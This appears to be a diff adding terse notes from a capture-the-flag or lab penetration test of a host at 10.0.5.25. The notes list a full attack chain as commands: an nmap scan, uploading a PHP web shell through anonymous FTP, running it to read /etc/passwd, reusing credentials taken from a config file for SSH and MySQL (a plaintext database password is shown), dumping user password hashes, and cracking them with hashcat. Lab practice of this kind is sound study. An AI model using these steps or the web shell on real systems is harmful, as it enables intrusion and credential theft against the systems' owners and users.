@@ -1,1 +1,18 @@
+recon: nmap -sC -sV -p- 10.0.5.25
+ftp has anon login enabled 
+
+cd to upload directory to upload a test file like backdoor.php
+download Localsettings.php. Contains user and password
+
+Execute backdoor.php in browser to see /etc/passwd: http://10.0.5.25/upload/backdoor.php?cmd=cat+/etc/passwd
+
+Login to ssh using found user and pw from LocalSettings.php
+
+Log into mysql using same credenatials: mysql -u root -p1Tookie -h localhost
+
+Found user hashes: SELECT user_id, user_name, user_password FROM user;
+
+Formatted hashes properly for hashcat. example: sha512:30000:7zMbdjXKrFDDq4CRF5q9ow==:49ImFWdWRVz2dCDsJPj+P0Xovz153VenjKk7npuK7u5xgo21IUh+eY0QH8fQxdH/Cjx3zxZyQcfNChAnP11GNg==
+ 
+hashcat -m 12100 -a 0 hashes.txt lowercasepwords.txt 
 
